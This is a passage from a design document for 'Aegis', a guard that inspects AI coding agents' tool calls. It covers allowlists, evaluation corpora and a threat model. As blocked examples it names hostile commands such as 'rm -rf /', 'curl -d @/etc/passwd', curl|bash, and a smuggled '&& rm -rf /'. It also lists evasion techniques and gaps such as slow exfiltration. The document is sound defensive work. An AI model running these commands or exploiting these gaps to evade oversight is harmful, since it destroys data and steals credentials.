The daemon connection uses a Unix socket (`/tmp/aegis-daemon.sock`) with a 200ms total timeout (50ms connect timeout, 200ms HTTP timeout). The daemon has session state, so it can run Phase 2 behavioral analysis and Phase 3 LLM classification. Inline evaluation is Phase 1 only — no session state, no behavioral analysis.

The daemon is optional. Aegis degrades gracefully: Phase 1 alone catches the vast majority of dangerous patterns (all DENY rules at priorities 10-22 operate entirely on Phase 1 signals). Phase 2 adds detection for session-based patterns that require history; its absence means these patterns are not caught, but Phase 1 still blocks the most dangerous individual operations.

```mermaid
flowchart TD
    subgraph IDE["IDE / Agent"]
        Cursor["Cursor / Claude Code"]
    end
    subgraph Aegis["Aegis"]
        Hook["Hook Binary\n(stdin/stdout JSON)"]
        Daemon["Daemon\n(Unix socket)"]
    end
    subgraph Tools["Tool Execution"]
        Shell["Shell"]
        FS["Filesystem"]
    end
    Cursor -->|"hooks.json"| Hook
    Hook -->|"Phase 1 inline"| Hook
    Hook -->|"Phase 2 via socket"| Daemon
    Hook -->|"allow/deny"| Cursor
    Daemon -->|SSE| Dashboard["Demo UI\n(:7474)"]
```

### Hook Protocol

```mermaid
sequenceDiagram
    participant C as Cursor IDE
    participant H as Hook Binary
    participant D as Daemon (optional)
    C->>H: stdin JSON {"command":"rm -rf /","cwd":"/home/user"}
    H->>H: Parse + normalize to (tool, args, cwd)
    H->>D: Unix socket evaluate (200ms timeout)
    alt daemon available
        D->>D: Phase 1 + Phase 2 (session state)
        D-->>H: {action: "deny", confidence: 0.95, rule: "critical_path_destruction"}
    else daemon unavailable
        H->>H: Inline Phase 1 only
    end
    H-->>C: stdout {"permission":"deny","user_message":"...","agent_message":"..."}
```

### Agent ID and Session Tracking

The hook binary derives a stable agent ID from CWD:

```go
func agentID(req *normalizedRequest) string {
    if req.CWD == "" {
        return ""
    }
    return "hook:" + req.CWD
}
```

This means all requests from the same project directory are considered the same session. If multiple agents operate in the same directory simultaneously, they share session state — which is conservative (retry-after-deny detection becomes more sensitive) but not incorrect.

### Audit WAL

The hook binary opens `~/.aegis/audit.log` on startup via `telemetry.Open()`. Every evaluated request writes a `telemetry.Event` to the WAL, regardless of the allow/deny outcome. The WAL write happens after the decision but before writing to stdout — an event is recorded even when the hook exits early due to `AEGIS_MODE=audit`.

`AEGIS_MODE=audit` runs full evaluation but always writes allow to stdout, logging would-be denials to stderr. `AEGIS_MODE=off` skips evaluation entirely and always allows.

---

## 9. Allowlist Design

### Three Bypass Types

`allowlist.Config` in `pkg/aegis/allowlist/config.go` defines three bypass mechanisms:

```yaml
# .aegis/allowlist.yaml
hosts:
  - staging.company.com
  - "*.registry.internal"
commands:
  - "docker push registry.internal/*"
  - "npm publish --registry https://internal.npmjs.company.com"
paths_safe:
  - .env
  - .env.local
  - secrets/dev-only.json
```

Allowlists are loaded additively from two locations: `{projectDir}/.aegis/allowlist.yaml` and `~/.aegis/allowlist.yaml`. Both files contribute to the same `Config`; neither overrides the other.

### Injection Resistance

`globMatch()` implements anchored glob matching with a documented security contract:

> The pattern must match the ENTIRE command string from start to end. A trailing `*` allows arbitrary suffixes, but without it the command must end at the last literal segment.

The comment in the code gives an explicit injection example: pattern `docker push registry.internal/*` does NOT match `docker push registry.internal/img && rm -rf /` because the trailing `&& rm -rf /` is not covered by the pattern.

The implementation splits on `*`, requires the first segment to anchor at position 0 (injection resistance: can't prepend arbitrary content), and requires remaining segments to appear in order. Without a trailing `*`, the last segment must exhaust the input string.

### Traversal Protection

`IsSafePath()` normalizes the input path with `filepath.Clean()` before matching. This converts `../../.env` to an absolute path outside the project, preventing traversal bypass of a bare `.env` entry.

The matching logic further distinguishes basename entries (no `/` in the pattern) from path entries:
- Basename entries (`paths_safe: [.env]`) match any file with that name, but only if the path is relative or ends with the basename. They do NOT match `/etc/.env` (which would be caught by the critical path rules regardless).
- Path entries (`paths_safe: [secrets/dev-only.json]`) match against the full cleaned path.

### Why Allowlists Mutate Signals Rather Than Bypass Rules

Allowlist matches do not skip rule evaluation for path and network signals. Instead, `applyAllowlistMutations()` modifies the signal bundle before rule evaluation:

```go
// Downgrade sensitive flag for explicitly allow-listed paths
for i := range bundle.Path.Paths {
    if bundle.Path.Paths[i].Sensitive && al.IsSafePath(bundle.Path.Paths[i].Raw) {
        bundle.Path.Paths[i].Sensitive = false
    }
}

// Mark configured hosts as known-safe
for i := range bundle.Network.Hosts {
    if !bundle.Network.Hosts[i].IsKnownSafe && al.IsAllowedHost(bundle.Network.Hosts[i].Host) {
        bundle.Network.Hosts[i].IsKnownSafe = true
    }
}
```

This means allowlists adjust signal classification, not rule semantics. A path marked safe by the allowlist no longer triggers `HasSensitive = true`, so rules that check `b.Path.HasSensitive` naturally pass. This is preferable to explicit bypass because:

1. Rules remain complete: no special-casing per rule for allowlist entries.
2. Allowlist coverage is auditable: the allowlist affects exactly those signals it pertains to.
3. Defense-in-depth: an allowlisted path still gets evaluated by other signals (e.g., DLP still fires if the command contains embedded credentials).

Command allowlists bypass rule evaluation entirely because a command match is an explicit declaration that the full command is safe. This is checked before signal computation in `checkAllowlist()`.

---

## 10. Eval Methodology

### Corpus Design

The evaluation corpus in `testdata/eval/` is organized into four components:

| File | Count | Purpose |
|------|-------|---------|
| `attacks.jsonl` | 170 cases | Labeled attack tool calls; expected decision: DENY |
| `attacks-native.jsonl` | 170 cases | Same attacks in native (non-MCP) format |
| `benign.jsonl` | 132 cases | Labeled benign tool calls; expected decision: ALLOW |
| `benign-native.jsonl` | 132 cases | Same benign cases in native format |
| `edge-cases.jsonl` | 80 cases | Ambiguous cases; expected decisions mixed |
| `sequences/attack-sequences.jsonl` | 25 sequences | Multi-step attack patterns for Phase 2 eval |
| `sequences/benign-sequences.jsonl` | 25 sequences | Multi-step benign workflows for Phase 2 eval |

The attack corpus covers categories including: privilege escalation, remote code execution, data exfiltration, credential access, persistence installation, system destruction, and evasion techniques. The benign corpus covers the full range of legitimate AI coding agent workflows: building, testing, git operations, package management, file editing, network fetches to known registries.

### Metrics

The eval pipeline computes:

- **Recall** (attack detection rate): `true_denies / total_attacks`. Target ≥ 90%.
- **False Positive Rate (FPR)**: `false_denies / total_benign`. Target ≤ 5%.
- **F1 Score**: harmonic mean of precision and recall.
- **P99 Latency**: 99th percentile evaluation time across all cases.
- **Per-rule attribution**: which rule fired for each case, enabling detection of rule overlap and coverage gaps.
- **Confidence calibration**: whether rule confidence scores match empirical accuracy (confidence 0.90 should mean 90% correct).

### Regression Gates

CI fails if:
- Recall drops by more than 1% relative to the baseline measurement.
- FPR increases by more than 1% relative to the baseline measurement.

These thresholds are intentionally tight. A 1% recall drop means approximately 1-2 attacks per 170 that were previously caught now slip through. A 1% FPR increase means approximately 1-2 benign operations per 132 that were previously allowed now get blocked. Both are meaningful regressions in a security tool.

### Why Sequence Evaluation Matters

Single-request evaluation cannot detect Phase 2 behavioral patterns. The sequence corpus (`sequences/`) provides multi-step scenarios that are replayed in order through the engine with a shared `AgentID`. Only by replaying the sequence does the session state accumulate enough history for `matchSequences()` and retry-after-deny detection to activate.

Without sequence evaluation, `retry_after_deny`, `exfil_after_sensitive_read`, `encoded_exfil`, and `session_fits_baseline` would never be regression-tested — they would only activate in production.

```mermaid
flowchart LR
    subgraph Corpus["Test Corpus (380+)"]
        Attacks["attacks.jsonl\n170 cases"]
        Benign["benign.jsonl\n132 cases"]
        Edge["edge-cases.jsonl\n80 cases"]
        Sequences["sequences/\n50 multi-step"]
    end
    Corpus --> Engine["Aegis Engine\n(full 3-phase)"]
    Engine --> Metrics["Metrics"]
    Metrics --> Recall["Recall >= 90%"]
    Metrics --> FPR["FPR <= 5%"]
    Metrics --> F1["F1 Score"]
    Metrics --> P99["P99 Latency"]
    Metrics --> PerRule["Per-Rule Attribution"]
    Metrics --> Calibration["Confidence Calibration"]
    Metrics --> Baseline{"Regression\nCompare"}
    Baseline -->|"recall drop >1%"| Fail["CI FAIL"]
    Baseline -->|"FPR rise >1%"| Fail
```

---

## 11. Key Tradeoffs

### Latency vs. Detection Depth

Phase 1 static rules complete in <50µs and catch all the high-confidence cases. Phase 2 behavioral adds <1ms but requires session state — it catches multi-step patterns that Phase 1 cannot see. Phase 3 LLM adds ~200ms and catches genuinely ambiguous cases that require reasoning about context.

The tradeoff: for interactive development, the P99 case matters more than the average. If Phase 3 activates frequently, P99 latency jumps to ~500ms (the timeout), which is perceptible. The cascade is designed so Phase 3 is rare — activated only for ESCALATE outputs from Phase 2, which requires both Phase 1 confidence below 0.85 AND Phase 2 producing an ESCALATE action.

### False Positives vs. Security

DENY rules are calibrated conservatively. Rules that could generate false positives are given lower confidence and narrower conditions. For example, `benign_docker_ops` (priority 55) explicitly allows docker/kubectl operations without privileged flags, preventing the high verb-danger score of `docker` from triggering false denials.

The cost of false positives is higher than the cost of false negatives in some contexts: a developer who gets their legitimate `git push` blocked will disable Aegis. The ALLOW rules at priorities 50-66 are designed to be permissive enough that normal AI coding agent workflows (build, test, deploy, commit) proceed without interruption.

### Stateless Hook vs. Stateful Daemon

The hook binary is stateless to keep its overhead minimal and its failure modes simple. It processes one request, writes one response, and exits. No goroutines, no persistent connections, no shared state between invocations.

The daemon maintains session state across all requests for an agent session. The architectural split means:
- Daemon unavailable → Phase 1 only, no session-based detection.
- Hook binary bug → affects only one request, daemon state is unaffected.
- Daemon bug → all requests fall back to Phase 1.

This separation also makes the hook binary trivially installable: it is a single binary with no configuration beyond the hooks.json entry.

### Rule Explainability vs. ML Flexibility

Every decision carries a `Rule` field: `critical_path_destruction`, `data_exfiltration`, `session_fits_baseline`. This enables post-incident forensics, operator tuning, and user-facing explanations.

An ML classifier would have higher recall on novel attack patterns but could not explain its decisions in auditable terms. The rule system is extended by writing new `Rule` structs in `Phase1Rules()` — a data entry task that does not require understanding the ML model's internals.

Phase 3 LLM intent classification is the compromise: it handles genuinely novel cases while Phase 1 and Phase 2 handle everything for which a principled rule can be written.

### Memory Bounded vs. Perfect History

The ring buffers in `session.State` bound memory at the cost of losing history older than 100 calls. An attack that involves a preparatory step more than 100 calls ago will not be detected by sequence matching.

The 100-call bound was chosen to balance memory (a reasonable upper bound for an interactive coding session's relevant recent history) against the cost of growing maps or slices. For very long sessions (hours of continuous agent activity), the 100-call window covers approximately the last few minutes, which is the relevant temporal window for exfiltration and escalation patterns.

---

## 12. Threat Model

### What Aegis Protects Against

**In-session destructive actions**: Commands that would destroy data (`rm -rf /`, `mkfs`, `dd if=/dev/zero`), control the system (`shutdown`, `reboot`), or overwrite critical system files are blocked by Phase 1 DENY rules with 0.95-0.99 confidence.

**Credential exfiltration**: DLP scanning catches real credentials embedded in command arguments. Sensitive file access rules block reading `/etc/shadow`, `~/.ssh/id_rsa`, `~/.aws/credentials`, and similar files. Network data-upload rules block `curl -d @/etc/passwd`.

**Prompt injection escalation**: When injected content in a codebase tricks the agent into running dangerous commands, the resulting tool calls are evaluated on their content — not on the agent's claimed justification. The evasion detection layer catches encoding and wrapper-stacking techniques commonly used in injection payloads.

**Persistence installation**: Cron job installation (`crontab -e`, writes to `/etc/cron*`) and shell profile modification with exec/network content (`.bashrc` persistence) are blocked by dedicated rules.

**Privilege escalation**: `passwd`, `visudo`, and `sudo` wrapping shell interpreters or elevated danger verbs are denied. SUID bit manipulation (`chmod +s`) is detected.

**Download-and-execute patterns**: `curl|bash`, `wget|sh`, `base64 -d|bash` (encoding detection) and `/tmp/` binary execution are blocked as remote code execution.

**Multi-step exfiltration sequences**: Phase 2 detects `exfil_after_sensitive_read` (sensitive read → network write in 30 seconds), `encoded_exfil` (sensitive read + base64 → network write in 60 seconds), and `retry_after_deny` (same verb retried after deny).

### What Aegis Does NOT Protect Against

**Compromised allowed operations**: If an allowed operation is itself unsafe (e.g., running `npm test` when `test` scripts execute malicious code), Aegis does not inspect the contents of allowed script files.

**Slow exfiltration**: An attacker who waits longer than the sequence-matching windows (30-60 seconds) between steps will not trigger sequence patterns. Phase 1 signal-based detection still applies to individual steps.

**Novel attack vectors**: Attacks using binaries not in `verbDangerTable` with danger score 0 (treated as 0.0) may not trigger command-based rules. Path and DLP signals still apply.

**Social engineering via approved outputs**: If the agent convinces the user to approve a dangerous operation through HITL (Human-in-the-Loop), Aegis has no visibility into the approval workflow.

**Kernel-level or hardware attacks**: Aegis operates at the tool-call layer. Attacks that bypass the shell entirely (e.g., direct syscalls, hardware exploitation) are out of scope.

**Agent-to-agent attacks**: Cross-session attacks where one agent corrupts another agent's session state are not modeled; each agent session is isolated.

### Evasion Resistance Layers

Aegis has multiple overlapping evasion-resistance mechanisms:

```mermaid
flowchart TD
    Raw["Raw Command String"] --> Strip["Wrapper Stripping\nsudo/env/nohup/timeout"]
    Strip --> AST["Shell AST Parse\n(mvdan.cc/sh)"]
    AST --> Vars["Variable Resolution\n$HOME, ${X}, $(cmd)"]
    AST --> Pipes["Pipeline Analysis\ncurl|bash, cat|nc"]
    AST --> Encoding["Encoding Detection\nbase64 -d, xxd, printf \\x"]
    AST --> Subst["Command Substitution\n$(rm -rf /), backticks"]
    Vars --> Danger["Verb Danger Lookup\n70+ binary table"]
    Pipes --> Danger
    Encoding --> Danger
    Subst --> Danger
    Danger --> Score["Evasion Score\n0.0 - 1.0"]
```

**Layer 1 — Wrapper stripping**: `AnalyzeEvasion()` counts wrappers (`sudo`, `env`, `nohup`, `timeout`, `nice`, `ionice`, `taskset`, `time`, `stime`) stripped from commands. The `privilege_escalation` rule fires when wrappers are present and the resulting verb is a shell interpreter or elevated danger verb.

**Layer 2 — AST parsing with `mvdan.cc/sh`**: Shell commands are parsed to AST rather than matched with regex. This catches `D=/; rm -rf $D` (variable expansion), `bash -c "rm -rf /"` (shell nesting), and `false && rm -rf /` (dead-branch analysis — the AST walk visits all branches regardless of runtime reachability).

**Layer 3 — Full extractor dry-run** (Phase 2): For requests that proceed to Phase 2, `computeSignalsFull()` uses `extract.NewExtractor(db)` (vs. the Phase 1 `extract.NewFastExtractor(db)`). The full extractor performs an interpreter dry-run that resolves `$VAR` values and captures actual binary names after variable expansion.

**Layer 4 — Encoding detection**: `base64ToShellPattern` and `curlPipeShell` regexes catch download-and-execute patterns even when they appear in the middle of complex shell pipelines.

**Layer 5 — Path normalization**: `filepath.Clean()` and `~` expansion before path classification prevent traversal-based bypasses of path rules.

**Layer 6 — Retry detection**: An attacker who tries the same dangerous operation multiple times after denial triggers `retry_after_deny` with 0.92 confidence. Synonym substitution (`wget` after `curl` denied) is also caught by `equivalentVerb()`.

**Layer 7 — Allowlist injection resistance**: Glob matching is anchored. Pattern `safe-cmd *` cannot be bypassed by appending `&& rm -rf /` because the trailing content falls outside the wildcard.

---

## Appendix: Key Structs and File Map

| Struct | File | Purpose |
|--------|------|---------|
| `Engine` | `pkg/aegis/engine.go` | Top-level orchestrator; holds rules, bloom, sessions, allowlists |
| `Request` / `Decision` | `pkg/aegis/engine.go` | Public API types |
| `SignalBundle` | `pkg/aegis/signals/types.go` | All 6 signals for one tool call; `CompositeScore()` |
| `ToolClassSignal` | `pkg/aegis/signals/tool_class.go` | Signal 1: tool category and base risk |
| `CommandSignal` | `pkg/aegis/signals/command.go` | Signal 2: verb danger table, wrapper stripping |
| `PathSignal` | `pkg/aegis/signals/path.go` | Signal 3: path risk classification |
| `NetworkSignal` | `pkg/aegis/signals/network.go` | Signal 4: host classification and risk scoring |
| `DLPSignal` | `pkg/aegis/signals/dlp.go` | Signal 5: 13 credential pattern detectors |
| `EvasionSignal` | `pkg/aegis/signals/evasion.go` | Signal 6: encoding, wrappers, substitution |
| `BehavioralSignal` | `pkg/aegis/signals/behavioral.go` | Phase 2 computed signal: rate, retry, sequences, baseline |
| `Rule` | `pkg/aegis/rules/engine.go` | Single rule with priority, action, confidence, condition |
| `Phase1Rules()` | `pkg/aegis/rules/phase1.go` | All static Phase 1 rules |
| `BehavioralEvaluate()` | `pkg/aegis/rules/phase2.go` | Phase 2 behavioral rule evaluation |
| `State` | `pkg/aegis/session/state.go` | Per-agent ring buffers, baseline, deny history |
| `Filter` | `pkg/aegis/bloom/filter.go` | Bloom filter with xxhash double-hashing |
| `Classifier` | `pkg/aegis/intent/classifier.go` | Phase 3 LLM intent classifier with rate limiter |
| `Config` | `pkg/aegis/allowlist/config.go` | Allowlist with injection-resistant glob matching |

---

*Last updated: 2026-05-17. Reflects code at `pkg/aegis/` commit `61f2c3a`.*
